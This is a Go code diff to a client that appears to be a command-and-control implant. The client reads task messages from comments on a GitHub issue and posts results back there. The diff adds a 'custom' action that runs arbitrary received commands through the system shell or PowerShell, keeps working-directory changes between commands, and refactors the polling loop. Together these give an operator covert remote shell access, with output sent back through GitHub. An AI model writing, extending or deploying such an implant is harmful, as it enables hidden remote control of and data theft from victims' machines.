@@ -5,7 +5,9 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
+	"path/filepath"
 	"runtime"
+	"strings"
 	"time"
 )
 
@@ -32,6 +34,79 @@ func newClient(clientID string) *Client {
 		Version:   clientVersion,
 		StartedAt: time.Now().UTC(),
 	}
+}
+
+// ── Command execution ──────────────────────────────────────────────────────────
+
+// execute runs a shell command and returns its combined stdout+stderr.
+// Uses the platform's native shell so pipes, redirects, env vars, etc. all work.
+// og from ki
+
+func execute(cmd string) string {
+	trimmed := strings.TrimSpace(cmd)
+
+	// Intercept 'cd' so directory changes persist across commands.
+	if strings.EqualFold(trimmed, "cd") || strings.HasPrefix(strings.ToLower(trimmed), "cd ") {
+		return handleCd(trimmed)
+	}
+
+	var c *exec.Cmd
+	switch runtime.GOOS {
+	case "windows":
+		c = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd)
+	default:
+		c = exec.Command("/bin/sh", "-c", cmd)
+	}
+
+	out, err := c.CombinedOutput()
+	result := strings.TrimSpace(string(out))
+
+	if err != nil {
+		if result != "" {
+			return fmt.Sprintf("%s\n[exit error: %s]", result, err)
+		}
+		return fmt.Sprintf("[exit error: %s]", err)
+	}
+	if result == "" {
+		return "[command produced no output]"
+	}
+	return result
+}
+
+// handleCd changes the process working directory so subsequent commands inherit it.
+// Child shells can't change the parent's cwd, so we do it here.
+func handleCd(cmd string) string {
+	target := strings.TrimSpace(cmd[2:]) // strip 'cd'
+	target = strings.Trim(target, `"'`)  // strip quotes
+
+	if target == "" {
+		cwd, err := os.Getwd()
+		if err != nil {
+			return fmt.Sprintf("[error getting cwd: %s]", err)
+		}
+		return cwd
+	}
+
+	if target == "~" || strings.HasPrefix(target, "~/") || strings.HasPrefix(target, `~\`) {
+		home, err := os.UserHomeDir()
+		if err == nil {
+			if target == "~" {
+				target = home
+			} else {
+				target = filepath.Join(home, target[2:])
+			}
+		}
+	}
+
+	if err := os.Chdir(target); err != nil {
+		return fmt.Sprintf("cd: %s", err)
+	}
+
+	newDir, err := os.Getwd()
+	if err != nil {
+		return target
+	}
+	return newDir
 }
 
 /*
@@ -96,6 +171,13 @@ func (c *Client) handleTask(task GundoMessage) GundoMessage {
 			}
 		}()
 
+	case "custom":
+		if task.Command == "" {
+			result.Status = "error"
+			result.Output = "no command provided"
+			break
+		}
+		result.Output = execute(task.Command)
 	default:
 		result.Status = "error"
 		result.Output = "unsupported action"
@@ -155,80 +237,83 @@ func (c *Client) pollTasks(issueNumber int) {
 		return
 	}
 
-	var lastSeenCommentID int64
-
-	// Establish our starting point so we don't replay old tasks.
-	if len(comments) > 0 {
-		lastSeenCommentID = comments[len(comments)-1].ID
+	// Keep the existing startup behavior: bookmark history without executing it.
+	var checkpoint commentCheckpoint
+	if _, err := checkpoint.accept(comments); err != nil {
+		fmt.Printf("Error establishing comment bookmark: %v\n", err)
+		return
 	}
 
 	fmt.Printf("[+] Client %s listening for tasks...\n", c.ID)
 
 	for {
-		comments, err = listComments(issueNumber)
-		if err != nil {
+		if err := c.pollTasksOnce(
+			issueNumber,
+			&checkpoint,
+			listCommentsSince,
+			createComment,
+		); err != nil {
 			fmt.Printf("Error polling comments: %v\n", err)
-			time.Sleep(10 * time.Second)
+		}
+		time.Sleep(10 * time.Second)
+	}
+}
+
+// One iteration is separate from the timer so mocked tests can exercise the
+// actual task filtering and result posting without starting an endless loop.
+// replaced the huge loop inside of pollTasks
+func (c *Client) pollTasksOnce(issueNumber int, checkpoint *commentCheckpoint,
+	list func(int, time.Time) ([]IssueComment, error), post func(int, GundoMessage) error) error {
+	comments, err := checkpoint.poll(issueNumber, list)
+	if err != nil {
+		return err
+	}
+	// The bookmark includes all inspected comment types; only matching tasks run.
+	for _, comment := range comments {
+
+		// Convert the GitHub comment body into a Gundo message.
+		message, err := parseGundoMessage(comment.Body)
+		if err != nil {
+			fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
 			continue
 		}
 
-		// brute-force solution that can be fixed later
-		for _, comment := range comments {
-
-			// Ignore comments we've already seen.
-			if comment.ID <= lastSeenCommentID {
-				// continue always skips rest of iteration the moves on
-				continue
-			}
-
-			// Mark this transport message as seen.
-			lastSeenCommentID = comment.ID
-
-			// Convert the GitHub comment body into a Gundo message.
-			message, err := parseGundoMessage(comment.Body)
-			if err != nil {
-				fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
-				continue
-			}
-
-			// The client only executes task messages.
-			if message.Type != "task" {
-				continue
-			}
-
-			// Ignore tasks intended for a different client.
-			if message.TargetClientID != c.ID {
-				continue
-			}
-
-			fmt.Printf(
-				"[+] Task received: %s (%s)\n",
-				message.TaskID,
-				message.Action,
-			)
-
-			// execute our supported action
-			// supported action takes the struct, builds a new one, and returns it
-			result := c.handleTask(message)
-
-			// Send the result back through the same GitHub mailbox.
-			err = createComment(issueNumber, result)
-			if err != nil {
-				fmt.Printf(
-					"Error posting result for task %s: %v\n",
-					message.TaskID,
-					err,
-				)
-				continue
-			}
-
-			fmt.Printf(
-				"[+] Result sent for task %s: %s\n",
-				message.TaskID,
-				result.Output,
-			)
+		// The client only executes task messages.
+		if message.Type != "task" {
+			continue
 		}
 
-		time.Sleep(10 * time.Second)
+		// Ignore tasks intended for a different client.
+		if message.TargetClientID != c.ID {
+			continue
+		}
+
+		fmt.Printf(
+			"[+] Task received: %s (%s)\n",
+			message.TaskID,
+			message.Action,
+		)
+
+		// execute our supported action
+		// supported action takes the struct, builds a new one, and returns it
+		result := c.handleTask(message)
+
+		// Send the result back through the same GitHub mailbox.
+		err = post(issueNumber, result)
+		if err != nil {
+			fmt.Printf(
+				"Error posting result for task %s: %v\n",
+				message.TaskID,
+				err,
+			)
+			continue
+		}
+
+		fmt.Printf(
+			"[+] Result sent for task %s: %s\n",
+			message.TaskID,
+			result.Output,
+		)
 	}
+	return nil
 }
